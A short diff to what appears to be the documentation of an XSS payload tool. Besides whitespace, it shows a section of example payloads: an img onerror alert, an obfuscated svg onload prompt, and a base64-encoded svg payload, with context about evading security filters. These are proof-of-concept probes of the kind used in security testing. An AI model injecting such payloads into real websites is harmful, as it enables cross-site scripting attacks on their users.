@@ -54,10 +54,13 @@ Enable obfuscation to bypass basic security filters by injecting comments and br
 ---
 
 ## Example Payloads
+
 **Basic Payload**
 `<img src="x" onerror="alert('XSS')">`
+
 **Obfuscated Payload**
 `<svg/onload=prompt`1`>`
+
 **Encoded Payload (Base64)**
 `PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUycpPg==`
 
